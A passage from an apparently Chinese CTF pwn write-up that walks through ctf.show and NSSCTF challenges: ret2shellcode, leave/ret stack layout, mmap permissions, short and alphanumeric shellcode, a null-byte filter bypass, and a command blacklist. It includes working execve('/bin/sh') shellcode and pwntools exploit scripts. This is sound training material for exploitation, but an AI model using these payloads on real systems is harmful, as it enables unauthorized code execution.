class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">push    68h </span><br><span class="line">; 小端序传参 /bin/sh</span><br><span class="line">push    732F2F2Fh; &quot;sh//&quot;</span><br><span class="line">push    6E69622Fh; &quot;/bin&quot;</span><br><span class="line">; 将栈顶的地址（即字符串 &quot;/bin/sh&quot; 的起始地址）复制给寄存器 ebx 。ebx寄存器将用作execve 系统调用的第一个参数</span><br><span class="line">mov     ebx, esp </span><br><span class="line">; int 80 执行系统调用的参数</span><br><span class="line">xor     ecx, ecx             </span><br><span class="line">xor     edx, edx             </span><br><span class="line">push    0Bh ; 送入系统调用号   11表示execve</span><br><span class="line">pop     eax; 弹出到eax进行系统调用</span><br><span class="line">int     80h     </span><br></pre></td></tr></table></figure><h3 id="execve函数原型"><a href="#execve函数原型" class="headerlink" title="execve函数原型"></a>execve函数原型</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>                        </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv[],<span class="type">char</span> *<span class="type">const</span> envp[])</span>;  </span><br></pre></td></tr></table></figure><h3 id="系统调用介绍"><a href="#系统调用介绍" class="headerlink" title="系统调用介绍"></a>系统调用介绍</h3><ul><li><p><strong>代码触发中断 0x80 ，这是Linux系统中用于执行系统调用的中断指令。通过设置适当的寄存器值（ eax 、ebx 、ecx 、edx ）， int 0x80 指令将执行 execve(“&#x2F;bin&#x2F;sh”, NULL, NULL) 系统调用，从而启动一个新的 shell 进程。</strong></p><blockquote><p>在Linux系统中，系统调用是用户空间程序与内核之间进行通信的一种机制，允许用户程序请求内核执行特权操作。在x86架构上，用于触发系统调用的中断指令是<code>int 0x80</code>。不过，随着时间的推移，32位和64位系统在系统调用方面有了一些变化。</p><h3 id="32位系统中的系统调用（x86）"><a href="#32位系统中的系统调用（x86）" class="headerlink" title="32位系统中的系统调用（x86）"></a>32位系统中的系统调用（x86）</h3><p>在32位x86系统中，使用中断0x80来触发系统调用是一种常见的方法。要执行一个系统调用，您需要在寄存器中设置相应的值，然后使用<code>int 0x80</code>指令触发中断。下面是一个简单的步骤示例：</p><ol><li>将系统调用号放入<code>eax</code>寄存器。</li><li>将系统调用的参数放入适当的寄存器，如<code>ebx</code>、<code>ecx</code>、<code>edx</code>、<code>esi</code>、<code>edi</code>等，具体取决于系统调用的参数个数和类型。</li><li>使用<code>int 0x80</code>指令触发中断，切换到内核态执行系统调用。</li><li>系统调用完成后，返回值通常会存储在<code>eax</code>寄存器中。</li></ol><h3 id="64位系统中的系统调用（x86-64）"><a href="#64位系统中的系统调用（x86-64）" class="headerlink" title="64位系统中的系统调用（x86_64）"></a>64位系统中的系统调用（x86_64）</h3><p>在64位x86_64系统中，使用中断0x80的方式不再是首选。相反，系统调用是通过使用<code>syscall</code>指令来实现的，它是一种更为现代和高效的方法。在x86_64架构下，系统调用的过程如下：</p><ol><li>将系统调用号放入<code>rax</code>寄存器。</li><li>将系统调用的参数放入<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>r10</code>、<code>r8</code>、<code>r9</code>寄存器，具体取决于系统调用的参数个数和类型。</li><li>使用<code>syscall</code>指令触发系统调用，切换到内核态执行系统调用。</li><li>系统调用完成后，返回值通常会存储在<code>rax</code>寄存器中。</li></ol><p>这种方式相较于中断0x80，具有更高的性能和更好的寄存器利用率，因此在64位系统中更为常见。</p></blockquote></li><li><p>注：64位类似，不再赘述</p></li></ul><h2 id="pwn58-59（ret2shellcode）"><a href="#pwn58-59（ret2shellcode）" class="headerlink" title="pwn58&#x2F;59（ret2shellcode）"></a>pwn58&#x2F;59（ret2shellcode）</h2><p>32e位不再赘述，这里说明64位寄存器读写问题，如果函数没有局部变量，那么是没有栈空间的，所以如果遇到危险函数栈溢出的话，有可能在寄存器进行栈溢出。</p><p>比如这串代码，在input中a1是没有局部变量的，是一个形式参数，所以理论上在input函数中gets的值是不在栈空间的，通过编译32位和64位可以得到简单结论（这里的操作最容易晕的是，用ida习惯性的查看读写变量的偏移发现点不进去）</p><ul><li>32位，直接优化代码然后利用main函数的栈空间进行读写</li><li>64位，直接在寄存器的空间进行读写和覆盖</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">input</span><span class="params">(<span class="type">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">gets</span>(a1);</span><br><span class="line">    <span class="built_in">puts</span>(a1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *a1;</span><br><span class="line">    <span class="built_in">input</span>(&amp;a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这两个题目就是直接送shellcode，刚开始理解，对于main函数执行完以后无法返回到shellcode，那么程序是如何执行shellcode的呢？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28188</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>gdb调试查看,发现奥秘了,leave会将栈空间清除，导致main函数栈空间的局部变量等都会受到影响。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x8048545 &lt;ctfshow+47&gt;    mov    ebx, dword ptr [ebp - 4]      &lt;_GLOBAL_OFFSET_TABLE_&gt;</span><br><span class="line">0x8048548 &lt;ctfshow+50&gt;    leave  </span><br><span class="line">0x8048549 &lt;ctfshow+51&gt;    ret    </span><br></pre></td></tr></table></figure><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230816015043315.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230816015043315.png"  class="" lazyload></a><p>栈空间在leave之后，刚好作为返回地址继续执行shellcode。</p><h2 id="pwn60-vmmap本地权限问题"><a href="#pwn60-vmmap本地权限问题" class="headerlink" title="pwn60(vmmap本地权限问题)"></a>pwn60(vmmap本地权限问题)</h2><p>在pwn60中，题目是一个很简单的题目，但是这里还是有一个关于vmmap的小点记录一下<br>先看解题代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buf2_addr = <span class="number">0x804a080</span> <span class="comment"># bss段落 </span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(buf2_addr)</span><br><span class="line">dbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>但是无法运行，用gdb查看的时候发现bss段没有执行权限，这个一般是文件有问题（**PS:**IDA中用CTRL+S调出各个段bss段也是没有可执行权限的），但是远程可以打通的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">     Start        End Perm     Size Offset File</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000      0 /mnt/d/Yixin/Desktop/CTFdemo/pwn</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000      0 /mnt/d/Yixin/Desktop/CTFdemo/pwn</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000   1000 /mnt/d/Yixin/Desktop/CTFdemo/pwn</span><br><span class="line"> 0x9b64000  0x9b86000 rw-p    22000      0 [heap]</span><br></pre></td></tr></table></figure><h2 id="pwn61（leave-ret和ret命令）"><a href="#pwn61（leave-ret和ret命令）" class="headerlink" title="pwn61（leave ret和ret命令）"></a>pwn61（leave ret和ret命令）</h2><p>在ROP链中的作用：</p><ul><li>RET：用于栈平衡的例子</li><li>LEAVE RET：用于栈迁移的情形</li></ul><p>三种函数返回汇编的区别：</p><blockquote><ol><li><strong>RET</strong>：<ul><li><code>RET</code>（Return）是用于函数返回的指令。它从被调用函数返回到调用者，同时恢复之前保存在栈上的返回地址。</li><li>在使用 <code>CALL</code> 指令调用函数时，调用者会将返回地址压入栈中。<code>RET</code> 指令会将栈顶的值弹出，并将控制权转移到该地址，从而返回到调用者函数。</li><li><code>RET</code> 指令没有参数，因为它假定返回地址已经保存在栈上。</li></ul></li><li><strong>LEAVE</strong>：<ul><li><code>LEAVE</code> 指令常用于函数的收尾部分，用于清理函数的栈帧。它执行两个操作：首先，将栈顶的值（即基址寄存器 <code>EBP</code> 的值）赋值给栈指针寄存器 <code>ESP</code>，从而恢复栈的位置；然后，从栈中弹出当前函数的,基址，即恢复上一个函数的栈帧。</li><li><code>LEAVE</code> 指令通常用于函数的返回前，用于恢复栈帧并清理栈上的局部变量。</li><li>相当于：MOV ESP,EBP ; POP EBP</li></ul></li><li><strong>RETN</strong>：<ul><li><code>RETN</code> 指令在一些特定的体系结构或汇编语言中用于函数返回。与其他指令不同，<code>RETN</code> 可能带有一个参数，用于指定从堆栈中弹出的字节数，而不仅仅是返回地址。</li><li>这个指定的字节数可能包括返回地址以及其他一些函数调用过程中保存在栈上的数据。在一些体系结构中，由于函数调用的约定可能涉及堆栈清理，因此 <code>RETN</code> 的参数允许在返回时清理堆栈上的数据。</li></ul></li></ol><p><code>RET</code> 用于简单的函数返回，<code>LEAVE</code> 用于清理栈帧局部变量等，而 <code>RETN</code> 在某些体系结构中用于带有堆栈清理的函数返回。具体在某种汇编语言中使用哪个指令取决于体系结构和编程约定。</p></blockquote><p>这道题main函数的返回指令就是leave ret，这样的话，函数返回以后因为栈空间的改变，无法使用原来局部变量的栈空间了。</p><p>而因为rsp的下一个地址空间是返回地址，也不能放shellcode，所以需要将shellcode放入v5+24+8的位置，返回地址填入shellcode的地址即可。</p><blockquote><p>一个点：当时调试的时候一直想着把shellcode放到返回地址不就可以执行了吗？然后调试才可以理解，这里需要放的是：shellcode的地址，而不是shellcode本身。比如你要操作的方向盘，而不是车子本身。</p></blockquote><p>解题代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 有简单的写法</span></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;[&#x27;)</span></span><br><span class="line"><span class="comment"># v5 = io.recvuntil(&#x27;]&#x27;, drop=True)</span></span><br><span class="line"><span class="comment"># v5 = int(v5, 16)</span></span><br><span class="line">v5 = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;]&#x27;</span>).split(<span class="string">b&#x27;[&#x27;</span>)[<span class="number">1</span>].split(<span class="string">b&#x27;]&#x27;</span>)[<span class="number">0</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># p64(v5+24+8)是shellcode的存放地址，让rip指针返回到shellcode本事即可</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(v5+<span class="number">24</span>+<span class="number">8</span>) + shellcode</span><br><span class="line">dbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn62-63-shellcode-长度限制"><a href="#pwn62-63-shellcode-长度限制" class="headerlink" title="pwn62&#x2F;63(shellcode 长度限制)"></a>pwn62&#x2F;63(shellcode 长度限制)</h2><p>在线网站:<a href="https://www.exploit-db.com/shellcodes/43550">https://www.exploit-db.com/shellcodes/43550</a></p><p>读入的是0x38个字符，除去不可读写的空间（0x38 - 0x18 - 0x8 &#x3D; 24 ）位的shellcode了，那么pwntools自带的shellcode是肯定不行的，可以找短一点的shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode =<span class="string">b&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(buf+<span class="number">0x20</span>) + shellcode</span><br></pre></td></tr></table></figure><h2 id="pwn64-mmap函数"><a href="#pwn64-mmap函数" class="headerlink" title="pwn64(mmap函数)"></a>pwn64(mmap函数)</h2><p>这个是开了nx保护，但是用mmap函数对空间赋予了可写可读可执行权限，这里简单说明mmap函数<code>mmap</code>（Memory Map）是一个在Unix-like操作系统中的系统调用，用于在进程的地址空间中创建一个新的内存映射区域，从而将磁盘文件或其他设备的内容映射到内存中。它可以用于多种目的，包括文件I&#x2F;O、进程间通信（如共享内存）、零拷贝技术等。</p><p>以下是关于<code>mmap</code>函数的一些解析：</p><p><strong>函数原型：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cCopy code</span><br><span class="line">void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);</span><br></pre></td></tr></table></figure><p><strong>参数说明：</strong></p><ul><li><code>addr</code>: 希望映射的内存起始地址，通常设置为0，由系统自动分配。</li><li><code>length</code>: 映射的内存区域大小（字节数）。</li><li><code>prot</code>:内存保护标志，指定内存区域的访问权限，可以是以下几个值的按位或组合：<ul><li><code>PROT_NONE</code>: 无访问权限。</li><li><code>PROT_READ</code>: 可读取。</li><li><code>PROT_WRITE</code>: 可写入。</li><li><code>PROT_EXEC</code>: 可执行。</li></ul></li><li>flags: 控制内存映射的方式和行为，可以是以下值的按位或组合：<ul><li><code>MAP_SHARED</code>: 允许多个进程共享映射区域的内容，对映射区域的修改会反映到所有共享该区域的进程。</li><li><code>MAP_PRIVATE</code>: 创建一个私有映射区域，对映射区域的修改不会影响其他进程。</li><li><code>MAP_ANONYMOUS</code>: 创建一个匿名映射区域，不与任何文件关联，可以用于零拷贝技术和进程间通信。</li></ul></li><li><code>fd</code>: 打开的文件描述符，用于关联一个文件到映射区域。如果不需要关联文件，可以传入-1。</li><li><code>offset</code>: 文件中的偏移量，表示映射区域开始的位置。对于无需关联文件的情况，通常设置为0。</li></ul><p><strong>返回值：</strong></p><ul><li>成功时，返回映射区域的起始地址。</li><li>失败时，返回<code>MAP_FAILED</code>（通常是<code>(void *)-1</code>），并设置<code>errno</code>以指示错误原因。</li></ul><p><strong>注意</strong>：以下代码中，buf的地址并不和返回的地址addr一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">size_t length1 = <span class="number">4096</span>;</span><br><span class="line">   <span class="built_in">int</span> b;</span><br><span class="line">   void *buf = &amp;b;</span><br><span class="line">   void *addr1 = mmap(buf, length1, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (addr1 == MAP_FAILED) &#123;</span><br><span class="line">       perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   printf(<span class="string">&quot;Buf address: %p\n&quot;</span>, buf);</span><br><span class="line">   printf(<span class="string">&quot;Mapped address: %p\n&quot;</span>, addr1);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>原因：</strong></p><blockquote><p>在<code>mmap</code>函数中，提供的起始地址<code>addr</code>只是一个建议值，而不是必须遵循的值。如果操作系统能够满足这个建议，并且在指定的地址范围内没有冲突，那么它会将映射分配在提供的起始地址处。但是，并不是所有情况下都能够遵循这个建议。</p><p>在你的测试代码中，你提供了一个栈上的变量<code>b</code>的地址作为<code>buf</code>参数，然后希望<code>mmap</code>函数将映射分配在这个地址上。然而，操作系统通常会有地址空间布局的限制，特别是对于用户空间的内存分配，以避免与其他已存在的内存区域发生冲突。因此，虽然你提供了一个建议的地址，但实际上操作系统可能选择一个不同的地址来分配映射区域。</p><p>你的测试代码中，<code>buf</code>和<code>addr1</code>的地址并不相同，这是因为操作系统可能决定在一个与<code>buf</code>地址不同的地方分配映射区域。这并不是错误，而是操作系统的地址分配策略所致。</p><p>如果你想要确保<code>mmap</code>返回的地址与你提供的<code>buf</code>地址相同，你应该使用一个合适的地址，而不是栈上的变量地址。你可以在合法且可访问的地址范围内选择一个地址作为建议值，这样操作系统可能更有可能遵循你的建议。</p><p>总之，<code>mmap</code>函数的地址分配在很大程度上取决于操作系统的内存管理策略，提供的地址只是一个建议，不一定会被完全遵循。</p></blockquote><h2 id="pwn65-汇编分析-可见字符shellcode"><a href="#pwn65-汇编分析-可见字符shellcode" class="headerlink" title="pwn65(汇编分析&amp;可见字符shellcode)"></a>pwn65(汇编分析&amp;可见字符shellcode)</h2><p>用汇编还原之后的伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x410</span>）    </span><br><span class="line"><span class="keyword">for</span> i in input to range len</span><br><span class="line">    <span class="keyword">if</span> input &lt; len  </span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> i &gt;= <span class="number">0x60</span>` and a &lt; <span class="number">0x7A</span>z</span><br><span class="line">    contiune</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> i &gt;= <span class="number">0x40</span>@ and a &lt; <span class="number">0x5A</span>Z</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> a &gt;= <span class="number">0x2F</span>/ and a &lt; <span class="number">0x5A</span>Z</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>大概逻辑是shellcode在可见字符，大致区间（0x60，0x7A）和（0x40，0x5A)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line">p.send(shellcode)</span><br></pre></td></tr></table></figure><h2 id="pwn66-shellcode判断逻辑绕过"><a href="#pwn66-shellcode判断逻辑绕过" class="headerlink" title="pwn66(shellcode判断逻辑绕过)"></a>pwn66(shellcode判断逻辑绕过)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check</span><span class="params">(<span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *i; <span class="comment">// 声明一个字符指针 i</span></span><br><span class="line">  <span class="keyword">while</span> (*buf) <span class="comment">// 当 buf 不为 null 继续循环</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="string">&quot;ZZJ loves shell_code,and here is a gift:\x0F\x05 enjoy it!\n&quot;</span>; *i &amp;&amp; *i != *buf; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 在这个循环中，i 逐个字符与 buf 中的字符进行比较</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 循环结束后，检查 i 是否为空或者 buf 中的字符在 i 中找到</span></span><br><span class="line">    <span class="keyword">if</span> (!*i)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>; <span class="comment">// 如果 buf 中的字符没有在 i 中找到，返回 0</span></span><br><span class="line">    ++buf; <span class="comment">// 移动到下一个字符</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>; <span class="comment">// 如果 buf 中的字符都在 i 中找到，返回 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里绕过buf不为null的不再循环，这里对shellcode的开头写入\x00进行截断即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;\x00\xc0&#x27;</span> + asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br></pre></td></tr></table></figure><ul><li>寻找以\X00的shellcode</li></ul><p><strong>注意点：</strong>这里不能只用\X00进行截断，因为shellcode是线性反汇编，这样的话shellcode完整性会受到破坏，必须要是一个完整的汇编语句，下面代码是寻找这种汇编语句的代码，运行后可以发现shellcode的会受到影响</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(disasm(payload))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>) </span><br><span class="line"><span class="built_in">print</span>(disasm(<span class="string">b&#x27;\x00\xc0&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;\x00\xc0&#x27;</span> + asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>) </span><br><span class="line"><span class="built_in">print</span>(disasm(payload))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>) </span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(disasm(payload))</span><br></pre></td></tr></table></figure><p>寻找代码(待研究)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环尝试生成各个长度的字节数组</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">    <span class="comment"># 使用 itertools.product 生成长度为 i 的字节组合，即生成所有 i 长度的组合</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> product([p8(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)], repeat=i):</span><br><span class="line">        payload = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;&quot;</span>.join(j)  <span class="comment"># 构造一个字节数组，首字节为 0x00，后面为 itertools 生成的组合</span></span><br><span class="line">        res = disasm(payload)  <span class="comment"># 反汇编 payload 字节数组</span></span><br><span class="line">        <span class="comment"># 根据一些条件进行筛选</span></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            res != <span class="string">&quot;...&quot;</span>  <span class="comment"># 不等于 &quot;...&quot;（未反汇编成功的情况）</span></span><br><span class="line">            <span class="keyword">and</span> <span class="keyword">not</span> re.search(<span class="string">r&quot;\[\w*?\]&quot;</span>, res)  <span class="comment"># 不包含形如 [some_variable] 的内容</span></span><br><span class="line">            <span class="keyword">and</span> <span class="string">&quot;.byte&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res  <span class="comment"># 不包含 &quot;.byte&quot; 指令（表示单个字节的指令）</span></span><br><span class="line">        ):</span><br><span class="line">            <span class="built_in">print</span>(res)  <span class="comment"># 打印反汇编结果</span></span><br><span class="line">            <span class="built_in">input</span>()  <span class="comment"># 等待用户输入，用于逐步查看结果</span></span><br></pre></td></tr></table></figure><h1 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h1><h2 id="SWPUCTF-2021-新生赛-nc签到（字符串过滤）"><a href="#SWPUCTF-2021-新生赛-nc签到（字符串过滤）" class="headerlink" title="[SWPUCTF 2021 新生赛]nc签到（字符串过滤）"></a>[SWPUCTF 2021 新生赛]nc签到（字符串过滤）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这里的${IFS}加大括号的原因是这样的</p><blockquote><p>在Unix和Unix-like系统（包括Linux）的shell中，<code>$&#123;IFS&#125;</code>使用大括号的形式是为了明确地指定一个环境变量。大括号在这里的作用是告诉shell，<code>$&#123;IFS&#125;</code>是一个环境变量的名称，而不是一个常规的字符串。</p><p><code>$&#123;IFS&#125;</code>中的<code>IFS</code>是一个特殊的环境变量，表示”Internal Field Separator”（内部字段分隔符）。它用于定义用于分隔单词和字段的字符，默认情况下包含空格、制表符和换行符。</p><p>在大括号内使用<code>$&#123;IFS&#125;</code>是一种良好的编程实践，尤其是在以下情况下：</p><ol><li>当需要将环境变量放在复杂的表达式中，以确保shell正确识别变量的边界。</li><li>当环境变量名后面跟着其他字符时，用大括号来明确指定变量的范围。</li></ol><p>例如，<code>$&#123;IFS&#125;abc</code>将会将<code>IFS</code>与<code>abc</code>拼接在一起，以生成一个新的字符串，而不是将<code>IFS</code>视为一个完整的变量名。</p><p>总之，使用大括号<code>$&#123;&#125;</code>来引用环境变量是一种良好的编程习惯，可以避免因变量名与其他字符混淆而引发错误。但在<code>$&#123;IFS&#125;</code>这个特定的例子中，如果<code>IFS</code>后面没有紧跟其他字符，大括号并不是必需的。所以在<code>$&#123;IFS&#125;</code>和<code>$IFS</code>之间没有实际的差异。</p></blockquote><p>但是，这里的字符串过滤中过滤掉了{IFS}，所以我们只能用空字符将其和后面的字符进行截断，这里使用的是$1,<code>$1</code>表示脚本或函数的第一个位置参数，为什么用这个呢？请看：</p><blockquote><p>如果没有传递任何参数给脚本，那么<code>$1</code>将为空。在这种情况下，<code>echo 